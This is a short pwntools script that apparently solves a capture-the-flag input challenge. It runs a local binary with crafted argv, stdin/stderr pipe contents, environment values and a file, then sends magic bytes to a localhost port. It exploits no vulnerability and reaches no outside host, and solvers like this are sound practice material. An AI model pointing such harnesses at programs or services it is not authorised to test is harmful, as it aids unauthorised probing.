from pwn import *
import os

g_fname = args.FNAME
g_port = int(args.PORT)

def pwn():
    # stage 4 file
    with open("\x0a", "w") as f:
        f.write("\x00\x00\x00\x00")
    
    # stage 1, 3
    arg = ['A']*100
    arg[ord('A')] = "\x00"
    arg[ord('B')] = "\x20\x0a\x0d"
    arg[ord('C')] = args.PORT

    r1, w1 = os.pipe()
    r2, w2 = os.pipe()

    # stage 2, stdio
    os.write(w1, b"\x00\x0a\x00\xff")
    os.write(w2, b"\x00\x0a\x02\xff")

    io = process(
        executable=args.FNAME,
        argv=arg, 
        env={"\xde\xad\xbe\xef" : "\xca\xfe\xba\xbe"}, 
        stdin=r1, 
        stderr=r2
        )

    # sleep(2)
    # stage5
    conn = remote('localhost', g_port)
    conn.sendline(b"\xde\xad\xbe\xef")

    io.interactive()

if "__main__" == __name__:
    context.log_level = "debug"
    pwn()